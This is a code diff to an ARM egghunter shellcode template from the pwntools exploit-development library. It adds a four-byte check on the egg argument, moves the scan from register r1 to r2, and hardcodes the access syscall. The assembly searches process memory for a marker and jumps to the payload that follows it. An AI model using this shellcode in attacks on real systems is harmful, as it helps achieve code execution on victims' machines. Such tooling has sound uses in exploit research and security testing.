@@ -1,7 +1,7 @@
 <% from pwnlib.shellcraft.arm import mov %>
 <% from pwnlib.util.packing import unpack %>
 <% from pwnlib import constants %>
-<%page args="egg = None"/>
+<%page args="egg"/>
 <%docstring>
     egghunter(egg)
 
@@ -12,6 +12,8 @@
 </%docstring>
 <%
     if not isinstance(egg, (int, long)):
+        if not len(egg) == 4:
+            raise Exception('Egg should be either an integer or a four byte string')
         egg = unpack(egg)
 %>
 egghunter:
@@ -22,21 +24,21 @@ egghunter:
     ${mov('r3', egg)}
 
 next_page:
-    mvn r1, r1, lsr #0x0c
-    mvn r1, r1, lsl #0x0c
+    mvn r2, r2, lsr #0x0c
+    mvn r2, r2, lsl #0x0c
 
 next_byte:
-    add r1, r1, #0x01
+    add r2, r2, #0x01
 
-    add r0, r1, #0x07
-    ${mov('r7', constants.linux.arm.SYS_access)}
+    add r0, r2, #0x07
+    mov r7, #0x21
     swi #0
 
     /* EFAULT = ${constants.linux.arm.EFAULT} means unmapped memory */
     cmn r0, #${constants.linux.arm.EFAULT}
     beq next_page
 
-    ldm r1, {r4, r5}
+    ldm r2, {r4, r5}
 
     cmp r4, r3
     bne next_byte
@@ -44,5 +46,5 @@ next_byte:
     bne next_byte
 
 egg_found:
-    add r1, r1, #0x08
-    bx  r1
+    add r2, r2, #0x08
+    bx  r2
